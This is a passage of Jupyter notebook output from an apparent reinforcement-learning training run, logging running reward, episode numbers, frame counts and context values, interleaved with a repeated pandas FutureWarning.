      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 424\t Frame count: 224700\t Context: 1\n",
      "Running reward: 11.00\t Episode 424\t Frame count: 224800\t Context: 1\n",
      "Running reward: 11.00\t Episode 424\t Frame count: 224900\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 424\t Frame count: 225000\t Context: 1\n",
      "Running reward: 11.00\t Episode 425\t Frame count: 225100\t Context: 1\n",
      "Running reward: 11.00\t Episode 425\t Frame count: 225200\t Context: 2\n",
      "Running reward: 11.00\t Episode 425\t Frame count: 225300\t Context: 2\n",
      "Running reward: 11.00\t Episode 425\t Frame count: 225400\t Context: 2\n",
      "Running reward: 11.00\t Episode 425\t Frame count: 225500\t Context: 2\n",
      "Running reward: 11.00\t Episode 426\t Frame count: 225600\t Context: 1\n",
      "Running reward: 11.00\t Episode 426\t Frame count: 225700\t Context: 1\n",
      "Running reward: 11.00\t Episode 426\t Frame count: 225800\t Context: 1\n",
      "Running reward: 11.00\t Episode 426\t Frame count: 225900\t Context: 1\n",
      "Running reward: 11.00\t Episode 426\t Frame count: 226000\t Context: 1\n",
      "Running reward: 11.00\t Episode 426\t Frame count: 226100\t Context: 1\n",
      "Running reward: 11.00\t Episode 426\t Frame count: 226200\t Context: 2\n",
      "Running reward: 11.00\t Episode 426\t Frame count: 226300\t Context: 2\n",
      "Running reward: 11.00\t Episode 426\t Frame count: 226400\t Context: 2\n",
      "Running reward: 11.00\t Episode 426\t Frame count: 226500\t Context: 2\n",
      "Running reward: 11.00\t Episode 427\t Frame count: 226600\t Context: 1\n",
      "Running reward: 11.00\t Episode 427\t Frame count: 226700\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 427\t Frame count: 226800\t Context: 1\n",
      "Running reward: 11.00\t Episode 427\t Frame count: 226900\t Context: 1\n",
      "Running reward: 11.00\t Episode 427\t Frame count: 227000\t Context: 1\n",
      "Running reward: 11.00\t Episode 427\t Frame count: 227100\t Context: 1\n",
      "Running reward: 11.00\t Episode 427\t Frame count: 227200\t Context: 1\n",
      "Running reward: 11.00\t Episode 427\t Frame count: 227300\t Context: 1\n",
      "Running reward: 11.00\t Episode 427\t Frame count: 227400\t Context: 1\n",
      "Running reward: 11.00\t Episode 427\t Frame count: 227500\t Context: 1\n",
      "Running reward: 11.00\t Episode 427\t Frame count: 227600\t Context: 1\n",
      "Running reward: 11.00\t Episode 427\t Frame count: 227700\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 427\t Frame count: 227800\t Context: 1\n",
      "Running reward: 11.00\t Episode 427\t Frame count: 227900\t Context: 1\n",
      "Running reward: 11.00\t Episode 427\t Frame count: 228000\t Context: 1\n",
      "Running reward: 11.00\t Episode 427\t Frame count: 228100\t Context: 1\n",
      "Running reward: 11.00\t Episode 427\t Frame count: 228200\t Context: 1\n",
      "Running reward: 11.00\t Episode 427\t Frame count: 228300\t Context: 1\n",
      "Running reward: 11.00\t Episode 427\t Frame count: 228400\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 427\t Frame count: 228500\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 427\t Frame count: 228600\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 427\t Frame count: 228700\t Context: 1\n",
      "Running reward: 11.00\t Episode 427\t Frame count: 228800\t Context: 1\n",
      "Running reward: 11.00\t Episode 427\t Frame count: 228900\t Context: 1\n",
      "Running reward: 11.00\t Episode 427\t Frame count: 229000\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 427\t Frame count: 229100\t Context: 1\n",
      "Running reward: 11.00\t Episode 427\t Frame count: 229200\t Context: 1\n",
      "Running reward: 11.00\t Episode 427\t Frame count: 229300\t Context: 1\n",
      "Running reward: 11.00\t Episode 427\t Frame count: 229400\t Context: 2\n",
      "Running reward: 11.00\t Episode 428\t Frame count: 229500\t Context: 2\n",
      "Running reward: 11.00\t Episode 428\t Frame count: 229600\t Context: 2\n",
      "Running reward: 11.00\t Episode 428\t Frame count: 229700\t Context: 2\n",
      "Running reward: 11.00\t Episode 428\t Frame count: 229800\t Context: 2\n",
      "Running reward: 11.00\t Episode 428\t Frame count: 229900\t Context: 2\n",
      "Running reward: 11.00\t Episode 428\t Frame count: 230000\t Context: 2\n",
      "Running reward: 11.00\t Episode 428\t Frame count: 230100\t Context: 2\n",
      "Running reward: 11.00\t Episode 428\t Frame count: 230200\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 428\t Frame count: 230300\t Context: 2\n",
      "Running reward: 11.00\t Episode 428\t Frame count: 230400\t Context: 2\n",
      "Running reward: 11.00\t Episode 428\t Frame count: 230500\t Context: 2\n",
      "Running reward: 11.00\t Episode 428\t Frame count: 230600\t Context: 2\n",
      "Running reward: 11.00\t Episode 429\t Frame count: 230700\t Context: 2\n",
      "Running reward: 11.00\t Episode 429\t Frame count: 230800\t Context: 2\n",
      "Running reward: 11.00\t Episode 429\t Frame count: 230900\t Context: 2\n",
      "Running reward: 11.00\t Episode 429\t Frame count: 231000\t Context: 2\n",
      "Running reward: 11.00\t Episode 430\t Frame count: 231100\t Context: 1\n",
      "Running reward: 11.00\t Episode 430\t Frame count: 231200\t Context: 2\n",
      "Running reward: 11.00\t Episode 431\t Frame count: 231300\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 431\t Frame count: 231400\t Context: 2\n",
      "Running reward: 11.00\t Episode 432\t Frame count: 231500\t Context: 1\n",
      "Running reward: 11.00\t Episode 432\t Frame count: 231600\t Context: 1\n",
      "Running reward: 11.00\t Episode 432\t Frame count: 231700\t Context: 2\n",
      "Running reward: 11.00\t Episode 432\t Frame count: 231800\t Context: 2\n",
      "Running reward: 11.00\t Episode 432\t Frame count: 231900\t Context: 2\n",
      "Running reward: 11.00\t Episode 432\t Frame count: 232000\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 432\t Frame count: 232100\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 432\t Frame count: 232200\t Context: 2\n",
      "Running reward: 11.00\t Episode 433\t Frame count: 232300\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 433\t Frame count: 232400\t Context: 2\n",
      "Running reward: 11.00\t Episode 433\t Frame count: 232500\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 433\t Frame count: 232600\t Context: 2\n",
      "Running reward: 11.00\t Episode 433\t Frame count: 232700\t Context: 2\n",
      "Running reward: 11.00\t Episode 434\t Frame count: 232800\t Context: 1\n",
      "Running reward: 11.00\t Episode 434\t Frame count: 232900\t Context: 2\n",
      "Running reward: 11.00\t Episode 434\t Frame count: 233000\t Context: 2\n",
      "Running reward: 11.00\t Episode 434\t Frame count: 233100\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 434\t Frame count: 233200\t Context: 2\n",
      "Running reward: 11.00\t Episode 434\t Frame count: 233300\t Context: 2\n",
      "Running reward: 11.00\t Episode 434\t Frame count: 233400\t Context: 2\n",
      "Running reward: 11.00\t Episode 434\t Frame count: 233500\t Context: 2\n",
      "Running reward: 11.00\t Episode 434\t Frame count: 233600\t Context: 2\n",
      "Running reward: 11.00\t Episode 434\t Frame count: 233700\t Context: 2\n",
      "Running reward: 11.00\t Episode 434\t Frame count: 233800\t Context: 2\n",
      "Running reward: 11.00\t Episode 434\t Frame count: 233900\t Context: 2\n",
      "Running reward: 11.00\t Episode 434\t Frame count: 234000\t Context: 2\n",
      "Running reward: 11.00\t Episode 434\t Frame count: 234100\t Context: 2\n",
      "Running reward: 11.00\t Episode 435\t Frame count: 234200\t Context: 1\n",
      "Running reward: 11.00\t Episode 435\t Frame count: 234300\t Context: 1\n",
      "Running reward: 11.00\t Episode 435\t Frame count: 234400\t Context: 1\n",
      "Running reward: 11.00\t Episode 435\t Frame count: 234500\t Context: 1\n",
      "Running reward: 11.00\t Episode 435\t Frame count: 234600\t Context: 1\n",
      "Running reward: 11.00\t Episode 435\t Frame count: 234700\t Context: 1\n",
      "Running reward: 11.00\t Episode 435\t Frame count: 234800\t Context: 1\n",
      "Running reward: 11.00\t Episode 435\t Frame count: 234900\t Context: 1\n",
      "Running reward: 11.00\t Episode 435\t Frame count: 235000\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 435\t Frame count: 235100\t Context: 1\n",
      "Running reward: 11.00\t Episode 435\t Frame count: 235200\t Context: 1\n",
      "Running reward: 11.00\t Episode 435\t Frame count: 235300\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 435\t Frame count: 235400\t Context: 1\n",
      "Running reward: 11.00\t Episode 435\t Frame count: 235500\t Context: 1\n",
      "Running reward: 11.00\t Episode 435\t Frame count: 235600\t Context: 2\n",
      "Running reward: 11.00\t Episode 436\t Frame count: 235700\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 436\t Frame count: 235800\t Context: 2\n",
      "Running reward: 11.00\t Episode 437\t Frame count: 235900\t Context: 1\n",
      "Running reward: 11.00\t Episode 437\t Frame count: 236000\t Context: 1\n",
      "Running reward: 11.00\t Episode 437\t Frame count: 236100\t Context: 1\n",
      "Running reward: 11.00\t Episode 437\t Frame count: 236200\t Context: 1\n",
      "Running reward: 11.00\t Episode 437\t Frame count: 236300\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 437\t Frame count: 236400\t Context: 1\n",
      "Running reward: 11.00\t Episode 437\t Frame count: 236500\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 437\t Frame count: 236600\t Context: 1\n",
      "Running reward: 11.00\t Episode 437\t Frame count: 236700\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 438\t Frame count: 236800\t Context: 1\n",
      "Running reward: 11.00\t Episode 438\t Frame count: 236900\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 438\t Frame count: 237000\t Context: 1\n",
      "Running reward: 11.00\t Episode 438\t Frame count: 237100\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 439\t Frame count: 237200\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 439\t Frame count: 237300\t Context: 1\n",
      "Running reward: 11.00\t Episode 439\t Frame count: 237400\t Context: 1\n",
      "Running reward: 11.00\t Episode 439\t Frame count: 237500\t Context: 1\n",
      "Running reward: 11.00\t Episode 439\t Frame count: 237600\t Context: 1\n",
      "Running reward: 11.00\t Episode 439\t Frame count: 237700\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 439\t Frame count: 237800\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 439\t Frame count: 237900\t Context: 1\n",
      "Running reward: 11.00\t Episode 439\t Frame count: 238000\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 439\t Frame count: 238100\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 439\t Frame count: 238200\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 439\t Frame count: 238300\t Context: 1\n",
      "Running reward: 11.00\t Episode 439\t Frame count: 238400\t Context: 1\n",
      "Running reward: 11.00\t Episode 439\t Frame count: 238500\t Context: 1\n",
      "Running reward: 11.00\t Episode 439\t Frame count: 238600\t Context: 2\n",
      "Running reward: 11.00\t Episode 439\t Frame count: 238700\t Context: 2\n",
      "Running reward: 11.00\t Episode 439\t Frame count: 238800\t Context: 2\n",
      "Running reward: 11.00\t Episode 439\t Frame count: 238900\t Context: 2\n",
      "Running reward: 11.00\t Episode 439\t Frame count: 239000\t Context: 2\n",
      "Running reward: 11.00\t Episode 439\t Frame count: 239100\t Context: 2\n",
      "Running reward: 11.00\t Episode 439\t Frame count: 239200\t Context: 2\n",
      "Running reward: 11.00\t Episode 439\t Frame count: 239300\t Context: 2\n",
      "Running reward: 11.00\t Episode 439\t Frame count: 239400\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 439\t Frame count: 239500\t Context: 2\n",
      "Running reward: 11.00\t Episode 439\t Frame count: 239600\t Context: 2\n",
      "Running reward: 11.00\t Episode 439\t Frame count: 239700\t Context: 2\n",
      "Running reward: 11.00\t Episode 440\t Frame count: 239800\t Context: 1\n",
      "Running reward: 11.00\t Episode 440\t Frame count: 239900\t Context: 1\n",
      "Running reward: 11.00\t Episode 440\t Frame count: 240000\t Context: 1\n",
      "Running reward: 11.00\t Episode 440\t Frame count: 240100\t Context: 1\n",
      "Running reward: 11.00\t Episode 441\t Frame count: 240200\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 441\t Frame count: 240300\t Context: 2\n",
      "Running reward: 11.00\t Episode 441\t Frame count: 240400\t Context: 2\n",
      "Running reward: 11.00\t Episode 442\t Frame count: 240500\t Context: 1\n",
      "Running reward: 11.00\t Episode 442\t Frame count: 240600\t Context: 1\n",
      "Running reward: 11.00\t Episode 442\t Frame count: 240700\t Context: 1\n",
      "Running reward: 11.00\t Episode 442\t Frame count: 240800\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 442\t Frame count: 240900\t Context: 1\n",
      "Running reward: 11.00\t Episode 442\t Frame count: 241000\t Context: 1\n",
      "Running reward: 11.00\t Episode 442\t Frame count: 241100\t Context: 1\n",
      "Running reward: 11.00\t Episode 442\t Frame count: 241200\t Context: 2\n",
      "Running reward: 11.00\t Episode 442\t Frame count: 241300\t Context: 2\n",
      "Running reward: 11.00\t Episode 442\t Frame count: 241400\t Context: 2\n",
      "Running reward: 11.00\t Episode 443\t Frame count: 241500\t Context: 2\n",
      "Running reward: 11.00\t Episode 443\t Frame count: 241600\t Context: 2\n",
      "Running reward: 11.00\t Episode 443\t Frame count: 241700\t Context: 2\n",
      "Running reward: 11.00\t Episode 443\t Frame count: 241800\t Context: 2\n",
      "Running reward: 11.00\t Episode 443\t Frame count: 241900\t Context: 2\n",
      "Running reward: 11.00\t Episode 443\t Frame count: 242000\t Context: 2\n",
      "Running reward: 11.00\t Episode 443\t Frame count: 242100\t Context: 2\n",
      "Running reward: 11.00\t Episode 443\t Frame count: 242200\t Context: 2\n",
      "Running reward: 11.00\t Episode 443\t Frame count: 242300\t Context: 2\n",
      "Running reward: 11.00\t Episode 443\t Frame count: 242400\t Context: 2\n",
      "Running reward: 11.00\t Episode 443\t Frame count: 242500\t Context: 2\n",
      "Running reward: 11.00\t Episode 443\t Frame count: 242600\t Context: 2\n",
      "Running reward: 11.00\t Episode 443\t Frame count: 242700\t Context: 2\n",
      "Running reward: 11.00\t Episode 443\t Frame count: 242800\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 443\t Frame count: 242900\t Context: 2\n",
      "Running reward: 11.00\t Episode 443\t Frame count: 243000\t Context: 2\n",
      "Running reward: 11.00\t Episode 444\t Frame count: 243100\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 445\t Frame count: 243200\t Context: 2\n",
      "Running reward: 11.00\t Episode 445\t Frame count: 243300\t Context: 2\n",
      "Running reward: 11.00\t Episode 445\t Frame count: 243400\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 446\t Frame count: 243500\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 446\t Frame count: 243600\t Context: 1\n",
      "Running reward: 11.00\t Episode 446\t Frame count: 243700\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 446\t Frame count: 243800\t Context: 1\n",
      "Running reward: 11.00\t Episode 446\t Frame count: 243900\t Context: 1\n",
      "Running reward: 11.00\t Episode 446\t Frame count: 244000\t Context: 2\n",
      "Running reward: 11.00\t Episode 446\t Frame count: 244100\t Context: 2\n",
      "Running reward: 11.00\t Episode 446\t Frame count: 244200\t Context: 2\n",
      "Running reward: 11.00\t Episode 446\t Frame count: 244300\t Context: 2\n",
      "Running reward: 11.00\t Episode 446\t Frame count: 244400\t Context: 2\n",
      "Running reward: 11.00\t Episode 447\t Frame count: 244500\t Context: 1\n",
